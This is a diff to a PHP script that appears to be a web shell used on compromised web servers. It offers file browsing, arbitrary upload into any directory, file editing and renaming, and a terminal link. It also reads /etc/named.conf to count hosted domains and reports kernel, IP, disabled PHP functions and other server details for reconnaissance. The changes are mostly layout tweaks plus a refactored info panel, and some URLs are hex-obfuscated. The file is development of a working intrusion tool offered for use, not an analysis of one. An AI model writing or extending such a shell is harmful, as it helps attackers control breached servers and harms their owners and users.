@@ -87,11 +87,13 @@ if (!isset($_SESSION['login'])) {
 	}
 }
 ?>
+<head>
 <link rel="icon" href="https://cdn.onlinewebfonts.com/svg/img_552870.png" sizes="32x32">
 <meta name="viewport" content="width=device-width,height=device-height initial-scale=1">
 <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/flexboxgrid/6.3.1/flexboxgrid.min.css" type="text/css" >
 <link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.7.1/css/all.css"/>
 <link href="https://swisnl.github.io/jQuery-contextMenu/dist/jquery.contextMenu.css" rel="stylesheet" type="text/css" />
+</head>
 <style type="text/css">
 	@import url('https://fonts.googleapis.com/css2?family=Open+Sans&display=swap');
 	@import url('https://fonts.googleapis.com/css2?family=Ubuntu:ital@1&display=swap');
@@ -337,6 +339,7 @@ if (!isset($_SESSION['login'])) {
 	div.chname span,
 	div.edit span {
 		font-weight: bold;
+		text-align: left;
 	}
 	.block { 
 		clear: both;  
@@ -344,8 +347,9 @@ if (!isset($_SESSION['login'])) {
 		border-top: solid 1px #ECE9E9; 
 	}
     .block:first-child { 
-    	border: none; }
-    .block .img { 
+    	border: none;
+    }
+    .block .img img {
     	width: 50px; 
     	height: 50px; 
     	display: block; 
@@ -378,7 +382,6 @@ if (!isset($_SESSION['login'])) {
 		border-radius:5px;
 	}
 	td.action {
-		text-align: center;
 		font-size:25px;
 	}
 	td.files {
@@ -418,15 +421,6 @@ if (!isset($_SESSION['login'])) {
 	table.infos {
 		border-collapse: collapse;
 		border-spacing: 0;
-	}
-	table.infos td {
-		border-bottom: 1px solid rgba(0,0,0,0.16);
-	}
-	table.infos tr:first-child td {
-		border-bottom: none;
-	}
-	table.infos tr:last-child td {
-		border-bottom: none;
 	}
 	table.upload td,
 	table.infos td,
@@ -782,6 +776,9 @@ if (!isset($_SESSION['login'])) {
 			width:13%;
 
 		}
+		.display {
+			display: none;
+		}
 		select {
   			-moz-appearance: none;
   			-webkit-appearance: none;
@@ -795,10 +792,14 @@ if (!isset($_SESSION['login'])) {
 			border-radius: 5px;
 			background: #fff;
 		}
+		.cs {
+			width:100%;
+		}
 		div.center {
 			margin-top: -25px;
 			overflow: hidden;
 			background: none;
+			display;
 			height:700px;
 		}
 		.navbar a {
@@ -1179,7 +1180,7 @@ function myFunction() {
     		switch ($info) {
     			case 'hdd':
     				return "Total : ". self::formatSize(disk_total_space(getcwd())) ." &nbsp;&nbsp;
-    						Free : ".self::formatSize(disk_free_space(getcwd())) ."&nbsp;&nbsp;
+    						Free  : ".self::formatSize(disk_free_space(getcwd())) ."&nbsp;&nbsp;<br>
     						[ ".(int) (disk_free_space(getcwd())/disk_total_space(getcwd())*100)."% ]";
     				break;
     			case 'disable_function':
@@ -1207,23 +1208,23 @@ function myFunction() {
     				return phpversion();
     				break;
     			case 'domain':
-    				$domain = @file("/etc/named.conf", false);
-    				if (!$domain) {
-    					$result = "<font color=red size=2px>Cant Read [ /etc/named.conf ]</font>";
-						$GLOBALS["need_to_update_header"] = "true";
-    				} else {
+    				$d0mains = @file("/etc/named.conf", false);
+    				if (!$d0mains){
+    					print "<font color=red size=2px>Cant Read <i>/etc/named.conf</i></font>";
+    					$GLOBALS["need_to_update_header"] = "true";
+    				} else { 
     					$count = 0;
-    					foreach ($domain as $key => $value) {
-    						if (strstr($value, "zone")) {
-    							if (preg_match_all('#zone "(.*)"#', $value, $domain)) {
+    					foreach ($d0mains as $d0main){
+    						if (@strstr($d0main, "zone")){
+    							preg_match_all('#zone "(.*)"#', $d0main, $domains);
+    							flush();
+    							if (strlen(trim($domains[1][0])) > 2){
     								flush();
-    								if (strlen(trim($domain[1][0])) > 2) {
-    									flush();
-    									$count++;
-    								}
+    								$count++;
     							}
     						}
-    					} return $result . "Domain";
+    					}
+    					print $count. " Domain";
     				}
     			break;
     		}
@@ -1309,7 +1310,7 @@ function myFunction() {
                 	print self::unhex("68747470733a2f2f696d6167652e666c617469636f6e2e636f6d2f69636f6e732f7376672f313731392f313731393834332e737667");
                 	break;
                 case 'py':
-                	print self::unhex("68747470733a2f2f7777772e666c617469636f6e2e636f6d2f7072656d69756d2d69636f6e2f69636f6e732f7376672f3137322f3137323534362e737667");
+                	print self::unhex("68747470733a2f2f696d6167652e666c617469636f6e2e636f6d2f69636f6e732f7376672f3631372f3631373533312e737667");
                 	break;
                 case 'sh':
                 	print self::unhex("68747470733a2f2f696d6167652e666c617469636f6e2e636f6d2f69636f6e732f7376672f3631372f3631373533352e737667");
@@ -1321,9 +1322,6 @@ function myFunction() {
                 	print self::unhex("68747470733a2f2f696d6167652e666c617469636f6e2e636f6d2f69636f6e732f7376672f3833332f3833333532342e737667");
                 	break;
         	}
-    	}
-    	public static function icon($filename) {
-    		print("<img src='".self::getimg($filename)."'>");
     	}
     	public static function hex($string){
     		$hex = '';
@@ -1393,6 +1391,63 @@ function myFunction() {
             	} return round($filesize, 2) . " " . $array[$total];
         	}
     	}
+    	public static function displayinfo() { ?>
+    		<div class="infos">
+    			<table width="100%" class="infos">
+					<tr>
+						<td>System</td>
+						<td>:</td>
+						<td><?= x::info("kernel") ?></td>
+					</tr>
+					<tr>
+						<td>PHPVersi</td>
+						<td>:</td>
+						<td><?= x::info("phpversion") ?></td>
+					</tr>
+					<tr>
+						<td>IP</td>
+						<td>:</td>
+						<td><?= x::info("ip") ?></td>
+					</tr>
+					<tr>
+						<td>Software</td>
+						<td>:</td>
+						<td><?= x::info("software") ?></td>
+					</tr>
+					<tr>
+						<td>Domain</td>
+						<td>:</td>
+						<td><?= x::info("domain") ?></td>
+					</tr>
+					<tr>
+						<td>MySQL</td>
+						<td>:</td>
+						<td><?= x::info("mysql") ?></td>
+					</tr>
+					<tr>
+						<td>cURL</td>
+						<td>:</td>
+						<td><?= x::info("curl") ?></td>
+					</tr>
+					<tr>
+						<td>Mail</td>
+						<td>:</td>
+						<td><?= x::info("mail") ?></td>
+					</tr>
+					<tr>
+						<td>Disable Function</td>
+						<td>:</td>
+						<td><?= x::info("disable_function") ?></td>
+					</tr>
+					<tr>
+						<td>HDD</td>
+						<td>:</td>
+						<td><?= x::info("hdd") ?></td>
+					</tr>
+				</table>
+			</div>
+		</div>
+    	<?php }
 	}
 	$_POST['file'] = (isset($_POST['file'])) ? x::unhex($_POST['file']) : false;
 	?>
@@ -1401,14 +1456,6 @@ function myFunction() {
 			<a href="?cd=<?= x::hex(str_replace($_SERVER['SCRIPT_NAME'] , '', getcwd().$_SERVER['SCRIPT_NAME'])) ?>">
 				<i class="fa fa-home" aria-hidden="true"></i>
 				<span>Home</span>
-			</a>
-			<a href="?cd=<?= $_GET['cd'] ?>">
-				<i class="fa fa-file" aria-hidden="true"></i>
-				<span>Files</span>
-			</a>
-			<a href="?cd=<?= $_GET['cd'] ?>&info">
-				<i class="fa fa-info-circle" aria-hidden="true"></i> 
-				 <span>Info</span>
 			</a>
 			<a href="?cd=<?= $_GET['cd'] ?>&terminal">
 				<i class="fa fa-terminal" aria-hidden="true"></i>
@@ -1564,6 +1611,11 @@ function myFunction() {
 								<table width="100%" class="chname">
 									<tr>
 										<td class="action" colspan="3">
+											<span>
+												<a href="?cd=<?= $_GET['cd'] ?>">
+													<i class="fa fa-arrow-left" aria-hidden="true"></i>
+												</a>
+											</span>&nbsp;&nbsp;
 											<span>CHANGE NAME</span>
 										</td>
 									</tr>
@@ -1634,13 +1686,18 @@ function myFunction() {
 							</div>
 							<?php
 							break;
-						
 						case is_file($_POST['file']):
 							?>
 							<div class="chname">
 								<table width="100%" class="chname">
 									<tr>
 										<td class="action" colspan="3">
+											<span>
+												<a href="?cd=<?= $_GET['cd'] ?>">
+													<i class="fa fa-arrow-left" aria-hidden="true"></i>
+												</a>
+											</span>
+											&nbsp;&nbsp;
 											<span>CHANGE NAME</span>
 										</td>
 									</tr>
@@ -1708,10 +1765,10 @@ function myFunction() {
 									</form>
 								</table>
 							</div>
+							<br><br><br><br><br><br><br><br><br><br>
 							<?php
 							break;
 					}
-					exit;
 					break;
 				case 'edit':
 					if (isset($_POST['edit'])) {
@@ -1722,11 +1779,16 @@ function myFunction() {
 						}
 					}
 					?>
-					<title>Edit</title>
 					<div class="edit">
 						<table width='100%' class="edit">
 							<tr>
 								<td class="action" colspan="3">
+									<span>
+										<a href="?cd=<?= $_GET['cd'] ?>">
+											<i class="fa fa-arrow-left" aria-hidden="true"></i>
+										</a>
+									</span>
+									&nbsp;&nbsp;
 									<span>EDIT</span>
 								</td>
 							</tr>
@@ -1855,9 +1917,11 @@ function myFunction() {
 						<tr>
 							<td class="files">
 								<div class="block">
-									<a href="#<?= $rp ?>" data-modal='#action<?= $rp ?>' title='<?= basename($file['name']) ?>'>
+									<a  href="#<?= $rp ?>" 
+										data-modal='#action<?= $rp ?>' 
+										title='<?= basename($file['name']) ?>'>
 										<div class="img">
-											<img src="<?= x::getimg($file) ?>">
+											<img src="<?= x::getimg($file['name']) ?>">
 										</div>
 										<div class="name">
 											<div class="file">
@@ -1931,124 +1995,73 @@ function myFunction() {
 	</div>
 </div>
 <div class="col-xs-5 center">
-			<?php
-			if (isset($_GET['upload'])) {
-				?>
-				<div class="upload">
-					<table width="100%" class="upload">
-						<form method="post" enctype="multipart/form-data" id="myForm">
-							<tr>
-								<td class="action" colspan="3">
-									<span><i class="fa fa-upload"></i> UPLOAD</span>
-								</td>
-							</tr>
-							<tr>
-								<td>
-									<div id="upload" onclick="getFile()">CHOOSE FILE</div>
-									<div style='height: 0px;width: 0px; overflow:hidden;'>
-										<input 
-											id="upfile" 
-											type="file" 
-											name="file[]" 
-											onchange="javascript:updateList()" multiple>
-									</div>
-								</td>
-								<td><button type="submit" name="upload" id="submit">UPLOAD</button></td>
-							</tr>
-							<tr>
-								<td>
-									<div class="up" id="fileList"></div>
-								</td>
-							</tr>
-						</form>
-						</table>
-						<div class="role">
-							<table width="100%">
-								<?php
-								if (isset($_POST['upload'])) {
-									$files = count($_FILES['file']['tmp_name']);
-									for ($i=0; $i < $files ; $i++) { 
-										if (copy($_FILES['file']['tmp_name'][$i] , x::unhex($_GET['cd']). DIRECTORY_SEPARATOR .$_FILES['file']['name'][$i])) { ?>
-											<tr>
-												<td colspan="2">
-													<div class="alert">
-														<div class="success">
-															<img src="<?= x::getimg($_FILES['file']['name'][$i]) ?>" class='icons'> 
-															<a href="?cd=<?= $_GET['cd'] ?>&preview=<?= x::hex($_FILES['file']['name'][$i]) ?>">
-																<?= $_FILES['file']['name'][$i] ?>
-															</a>
-															
-															<span>Uploaded !</span>
-														</div>
-													</div>
-												</td>
-											</tr>
+	<?php
+	if (isset($_GET['upload'])) {
+		?>
+		<div class="upload">
+			<table width="100%" class="upload">
+				<form method="post" enctype="multipart/form-data" id="myForm">
+					<tr>
+						<td class="action" colspan="3">
+							<span><i class="fa fa-upload"></i> UPLOAD</span>
+						</td>
+					</tr>
+					<tr>
+						<td>
+							<div id="upload" onclick="getFile()">CHOOSE FILE</div>
+							<div style='height: 0px;width: 0px; overflow:hidden;'>
+								<input 
+									id="upfile" 
+									type="file" 
+									name="file[]" 
+									onchange="javascript:updateList()" multiple>
+							</div>
+						</td>
+						<td>
+							<button type="submit" name="upload" id="submit">UPLOAD</button>
+						</td>
+					</tr>
+					<tr>
+						<td>
+							<div class="up" id="fileList"></div>
+						</td>
+					</tr>
+				</form>
+			</table>
+			<div class="role">
+				<table width="100%">
+					<?php
+					if (isset($_POST['upload'])) {
+						$files = count($_FILES['file']['tmp_name']);
+						for ($i=0; $i < $files ; $i++) { 
+							if (copy($_FILES['file']['tmp_name'][$i] , x::unhex($_GET['cd']). DIRECTORY_SEPARATOR .$_FILES['file']['name'][$i])) { ?>
+								<tr>
+									<td colspan="2">
+										<div class="alert">
+											<div class="success">
+												<img src="<?= x::getimg($_FILES['file']['name'][$i]) ?>" class='icons'> 
+												<a href="?cd=<?= $_GET['cd'] ?>&preview=<?= x::hex($_FILES['file']['name'][$i]) ?>">
+													<?= $_FILES['file']['name'][$i] ?>	
+												</a>
+												<span>Uploaded !</span>
+											</div>
 										</div>
-									<?php } else {
-										print "<script>alert('Upload Failed')</script>";
-									}
-								}
-							}
-							?>
-						</table>
-					</div>
-				<?php
-				exit();
-			}
-			?>
-			<div class="infos">
-					<table width="100%" class="infos">
-						<tr>
-							<td>System</td>
-							<td>:</td>
-							<td><?= x::info("kernel") ?></td>
-						</tr>
-						<tr>
-							<td>PHPVersi</td>
-							<td>:</td>
-							<td><?= x::info("phpversion") ?></td>
-						</tr>
-						<tr>
-							<td>IP</td>
-							<td>:</td>
-							<td><?= x::info("ip") ?></td>
-						</tr>
-						<tr>
-							<td>Software</td>
-							<td>:</td>
-							<td><?= x::info("software") ?></td>
-						</tr>
-						<tr>
-							<td>Domain</td>
-							<td>:</td>
-							<td><?= x::info("domain") ?></td>
-						</tr>
-						<tr>
-							<td>MySQL</td>
-							<td>:</td>
-							<td><?= x::info("mysql") ?></td>
-						</tr>
-						<tr>
-							<td>cURL</td>
-							<td>:</td>
-							<td><?= x::info("curl") ?></td>
-						</tr>
-						<tr>
-							<td>Mail</td>
-							<td>:</td>
-							<td><?= x::info("mail") ?></td>
-						</tr>
-						<tr>
-							<td>Disable Function</td>
-							<td>:</td>
-							<td><?= x::info("disable_function") ?></td>
-						</tr>
-						<tr>
-							<td>HDD</td>
-							<td>:</td>
-							<td><?= x::info("hdd") ?></td>
-						</tr>
-					</table>
-				</div>
+									</td>
+								</tr>
+							</div>
+						<?php } else {
+							print "<script>alert('Upload Failed')</script>";
+						}
+					}
+				}
+				?>
+			</table>
 		</div>
+		<?php
+		exit();
+	}
+	?>
+	<div class="display">
+		<?= x::displayinfo() ?>
+	</div>
 </center>
